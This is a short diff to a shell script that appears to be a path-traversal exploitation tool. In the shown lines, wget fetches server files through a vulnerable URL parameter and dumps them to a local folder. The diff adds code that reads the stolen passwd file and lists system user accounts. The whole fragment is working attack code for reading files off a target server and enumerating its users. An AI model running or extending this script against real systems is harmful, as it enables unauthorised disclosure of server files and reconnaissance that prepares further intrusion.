@@ -32,6 +32,9 @@ else
             wget --quiet $1=$Enumeration -O $Dump.txt
             mv $Dump.txt Dump/$Path
         done
+        echo ""
+        echo "  [*] Enumerated system user:"
+        cat Dump/$Path/passwd.txt | grep "/home" | cut -d ":" -f1
     else
         echo "The application is not vulnerable to Path traversal"
     fi
